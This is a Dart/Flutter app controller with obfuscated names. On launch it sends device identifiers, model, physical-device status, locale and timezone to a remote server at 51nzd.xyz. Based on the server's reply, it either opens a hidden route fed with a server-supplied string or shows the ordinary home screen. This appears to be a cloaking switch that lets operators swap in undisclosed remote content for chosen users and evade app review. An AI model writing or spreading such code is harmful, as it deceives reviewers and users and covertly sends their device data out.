import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {


  var fyhmir = RxBool(false);
  var kthecyxrqu = RxBool(true);
  var tvdnmw = RxString("");
  var pauline = RxBool(false);
  var gerhold = RxBool(true);
  final agjxcsk = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    hpijzu();
  }


  Future<void> hpijzu() async {

    pauline.value = true;
    gerhold.value = true;
    kthecyxrqu.value = false;

    agjxcsk.post("https://niu.51nzd.xyz/qspvahokzwmluynbrjietdgfcx",data: await cyiatxeknz()).then((value) {
      var qwmoyl = value.data["qwmoyl"] as String;
      var jayqu = value.data["jayqu"] as bool;
      if (jayqu) {
        tvdnmw.value = qwmoyl;
        landen();
      } else {
        mante();
      }
    }).catchError((e) {
      kthecyxrqu.value = true;
      gerhold.value = true;
      pauline.value = false;
    });
  }

  Future<Map<String, dynamic>> cyiatxeknz() async {
    final DeviceInfoPlugin zdpqvx = DeviceInfoPlugin();
    PackageInfo hlmj_vomj = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var lzsvu = Platform.localeName;
    var awth_rWN = currentTimeZone;

    var awth_rDNVTYf = hlmj_vomj.packageName;
    var awth_rBx = hlmj_vomj.version;
    var awth_dYRx = hlmj_vomj.buildNumber;

    var awth_gtnwpTR = hlmj_vomj.appName;
    var candidaStroman = "";
    var awth_HM  = "";
    var earleneMarvin = "";
    var awth_Ro = "";
    var karlKirlin = "";
    var awth_eEzvrP = "";


    var awth_QfY = "";
    var awth_oGCJcw = false;

    if (GetPlatform.isAndroid) {
      awth_QfY = "android";
      var slpowdyj = await zdpqvx.androidInfo;

      awth_eEzvrP = slpowdyj.brand;

      awth_Ro  = slpowdyj.model;
      awth_HM = slpowdyj.id;

      awth_oGCJcw = slpowdyj.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      awth_QfY = "ios";
      var agpzob = await zdpqvx.iosInfo;
      awth_eEzvrP = agpzob.name;
      awth_Ro = agpzob.model;

      awth_HM = agpzob.identifierForVendor ?? "";
      awth_oGCJcw  = agpzob.isPhysicalDevice;
    }
    var res = {
      "awth_rBx": awth_rBx,
      "awth_rDNVTYf": awth_rDNVTYf,
      "awth_gtnwpTR": awth_gtnwpTR,
      "awth_Ro": awth_Ro,
      "awth_dYRx": awth_dYRx,
      "lzsvu": lzsvu,
      "awth_rWN": awth_rWN,
      "karlKirlin" : karlKirlin,
      "awth_eEzvrP": awth_eEzvrP,
      "awth_HM": awth_HM,
      "awth_oGCJcw": awth_oGCJcw,
      "earleneMarvin" : earleneMarvin,
      "awth_QfY": awth_QfY,
      "candidaStroman" : candidaStroman,

    };
    return res;
  }

  Future<void> mante() async {
    Get.offAllNamed("/home");
  }

  Future<void> landen() async {
    Get.offAllNamed("/resion");
  }

}
